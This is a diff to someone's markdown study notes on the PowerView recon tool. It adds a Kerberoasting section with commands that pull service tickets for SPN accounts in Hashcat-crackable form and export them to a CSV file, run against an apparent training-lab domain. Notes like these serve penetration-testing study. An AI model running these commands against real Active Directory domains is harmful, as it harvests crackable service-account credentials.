@@ -3,6 +3,7 @@ tags:
   - windows
   - powershell
   - password-policy
+  - kerberoasting
 ---
 # [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) (by PowerShell Mafia)
 PowerView is a tool written in PowerShell which, much like BloodHound, provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more.
@@ -56,6 +57,15 @@ PS > Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Objec
 - `SPN` attribute on accounts could indicate that the account may be subject to a Kerberoasting attack.
 ```powershell
 PS > Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
+#### Kerberoasting
+- Get a user's TGS Ticket in [[Hashcat]] format:
+```powershell
+PS > Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+- Get all TGS Tickets in `CSV`:
+```powershell
+PS > Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 ### [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/)
 It retrieves group-specific information. The `-Recurse` switch finds any groups that are part of the target group (nested group membership) to list out the members of those groups.
